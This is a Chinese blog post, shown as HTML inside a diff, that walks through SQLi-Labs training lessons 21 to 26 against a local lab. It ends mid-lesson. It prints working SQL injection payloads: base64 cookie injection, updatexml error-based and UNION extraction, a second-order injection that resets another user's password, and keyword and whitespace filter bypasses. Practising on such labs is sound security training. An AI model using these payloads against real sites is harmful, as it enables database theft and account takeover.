@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="R4x">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="R4x">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="道阻且长，行则将至">
+    <meta name="description" content="Lesson 21Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的回显">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-Labs靶场刷题记录【Adv Challenges】">
+<meta property="og:url" content="http://r4x.top/2022/11/21/SQLi-Labs%20Adv%20Challenges/index.html">
+<meta property="og:site_name" content="R4x&#39;s Blog">
+<meta property="og:description" content="Lesson 21Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的回显">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242135027.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242144482.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242145523.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242148450.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242149215.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210262345375.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737367.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737567.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282149203.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282151949.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282153831.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282157703.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032117869.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032208178.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032209721.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032209748.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032203781.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032217834.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032218492.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032218998.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211062143295.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211062145357.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211062153454.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211062209676.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121021168.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121038348.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121048633.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121048237.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121054005.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121106175.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121106762.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121112264.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121615843.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121619994.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121619606.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121844734.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211131828909.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141236272.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141248472.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141651758.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141851090.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141854580.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161345710.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161341745.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161343883.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161349451.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161738095.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161739401.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161753177.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161924337.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161924541.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161937883.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211162004960.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211162009090.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211162009242.png">
+<meta property="article:published_time" content="2022-11-21T01:32:04.123Z">
+<meta property="article:modified_time" content="2022-11-21T01:34:49.986Z">
+<meta property="article:author" content="R4x">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242135027.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>SQLi-Labs靶场刷题记录【Adv Challenges】 · R4x&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>R4x's Blog.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">R4x&#39;s Blog.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">SQLi-Labs靶场刷题记录【Adv Challenges】</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                SQLi-Labs靶场刷题记录【Adv Challenges】
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">3.3k</span>Reading time: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/11/21</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p> <img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242135027.png"></p>
+<h1 id="Lesson-21"><a href="#Lesson-21" class="headerlink" title="Lesson 21"></a>Lesson 21</h1><p><strong>Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）</strong><br>今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的回显：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242144482.png"><br>输入<code>admin:admin(username:password)</code>：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242145523.png"><br>和前面的题差不多，显示出了Http包中的一些信息，burp抓包：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242148450.png"><br>可以在这里看到base64编码后的cookie头，解码后的结果如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242149215.png"><br>这样思路就有了：构造payload-&gt;base64编码-&gt;重放，根据之前的题目，尝试构造一下updatexml的报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1) -- (注意最后还有个空格)</span><br></pre></td></tr></table></figure>
+<p>编码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSAtLSA=</span><br></pre></td></tr></table></figure>
+<p>重放：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210262345375.png"><br>可以看到爆出了信息，其余的和之前的类似</p>
+<h1 id="Lesson-22"><a href="#Lesson-22" class="headerlink" title="Lesson 22"></a>Lesson 22</h1><p><strong>Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</strong><br>根据标题，先尝试将Lesson21的单引号改为双引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) -- </span><br></pre></td></tr></table></figure>
+<p>Base64编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIC0tIA==</span><br></pre></td></tr></table></figure>
+<p>成功：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737367.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737567.png"><br>其余与之前类似</p>
+<h1 id="Lesson-23"><a href="#Lesson-23" class="headerlink" title="Lesson 23"></a>Lesson 23</h1><p><strong>GET - Error based - strip comments (基于错误的，过滤注释的GET型)</strong><br>根据标题可以知道肯定是过滤了注释符号，试一下单引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282149203.png"><br>发现报错，尝试闭合语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282151949.png"><br>并没有报错，猜一下列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<p>爆数据库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282153831.png"><br>表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282157703.png"><br>剩下的就和前面一样了，当然这里也可以使用<code>updatexml()</code>报错注入</p>
+<h1 id="Lesson-24"><a href="#Lesson-24" class="headerlink" title="Lesson 24"></a>Lesson 24</h1><p><strong>Second Degree Injections Real treat -Store Injections (二次注入)</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032117869.png"><br>根据题目，发现考察的是二次注入，有关二次注入的知识，参考这篇文章：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/">http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/</a></p>
+</blockquote>
+<p>先看一下修改密码处：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032208178.png"><br>发现不能修改，那就注册一个普通账号登上去看看：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032209721.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032209748.png"><br>发现这里可以修改密码，那么思路就有了：注册一个包含危险字符的账号<code>test&#39; #</code>，再登录上这个账号修改密码，此时在源码中的SQL语句就会变成这样：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;test&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
+<p>此时相当于直接修改了test用户的密码，而不需要该用户原本的账号，形成了任意用户密码修改的攻击<br>先注册名为<code>test&#39; #</code> 账号：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032203781.png"><br>登录：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032217834.png"><br>直接输入新密码修改，无需输入当前密码，即可修改test用户的密码：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032218492.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032218998.png"></p>
+<h1 id="Lesson-25"><a href="#Lesson-25" class="headerlink" title="Lesson 25"></a>Lesson 25</h1><p><strong>Trick with OR &amp; AND（过滤了OR和AND）</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211062143295.png"><br>打开界面，发现是这样的，简单测试后发现，输入后地下的hint会显示出输入插入进SQL语句的样子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-25/?id=1&#x27;  oorrder by 1 anandd &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211062145357.png"><br>回到题目，根据标题可以得知这关过滤了<code>OR</code>和<code>AND</code>，测试后发现只是简单的一层过滤，并没有递归过滤，那么可以按以下的方式绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oorrder -&gt; order</span><br><span class="line">oorr -&gt; or</span><br><span class="line">aandnd -&gt; and</span><br></pre></td></tr></table></figure>
+<p>除了这一点，其余与之前的题目没有区别：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),2  --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211062153454.png"></p>
+<h1 id="Lesson-25a"><a href="#Lesson-25a" class="headerlink" title="Lesson 25a"></a>Lesson 25a</h1><p><strong>Trick with OR &amp; AND Blind （过滤了or和and的盲注）</strong><br>这一关变成了过滤<code>OR</code>和<code>AND</code>的盲注，也没有用单引号包裹：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),2</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211062209676.png"><br>同时，这关并不会显示错误信息，其余的和之前一样，也可以使用盲注的方法爆数据</p>
+<h1 id="Lesson-26"><a href="#Lesson-26" class="headerlink" title="Lesson 26"></a>Lesson 26</h1><p><strong>Error based - All your SPACES and COMMENTS belong to us 过滤了所有空格和注释符号的报错注入</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121021168.png"><br>先探测一下闭合方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121038348.png"><br>单引号闭合，根据题目，应该是过滤了空格和注释符号，常见的绕过思路是使用URL编码绕过空格过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_urlencode.asp">HTML URL 编码参考手册</a><br>尝试如下payload：</p>
